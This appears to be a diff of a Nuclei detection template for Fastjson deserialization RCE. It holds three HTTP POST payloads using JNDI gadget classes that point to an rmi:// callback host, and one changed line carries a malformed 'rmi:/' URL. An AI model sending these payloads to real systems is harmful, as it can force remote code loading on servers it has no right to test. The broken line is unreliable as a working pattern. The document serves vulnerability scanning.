@@ -11,13 +11,11 @@ info:
     - https://github.com/wyzxxz/fastjson_rce_tool
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
+    cvss-score: 10.0
     cwe-id: CWE-77
-  metadata:
-    max-request: 3
   tags: fastjson,rce,deserialization,oast
 
-http:
+requests:
   - raw:
       - |
         POST / HTTP/1.1
@@ -28,6 +26,7 @@ http:
            "@type":"org.apache.shiro.jndi.JndiObjectFactory",
            "resourceName":"rmi://{{interactsh-url}}/Exploit"
         }
+
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -37,6 +36,7 @@ http:
            "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
            "jndiNames":"rmi://{{interactsh-url}}/Exploit"
         }
+
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -44,15 +44,14 @@ http:
 
         {
            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
-           "metricRegistry":"rmi://{{interactsh-url}}/Exploit"
+           "metricRegistry":"rmi:/{{interactsh-url}}/Exploit"
         }
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms DNS Interaction
+        part: interactsh_protocol   # Confirms DNS Interaction
         words:
           - "dns"
 
@@ -60,4 +59,5 @@ http:
         negative: true
         status:
           - 200
-# digest: 490a0046304402202217f96273b88d7fc52155279c4029261214c8f358b5ea4fa502f5b95bb9b80c02200b815b7aaca037a062c0cb1b657f74d199ac0c8a8099f007937b175fd61b8c2d:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/05/25
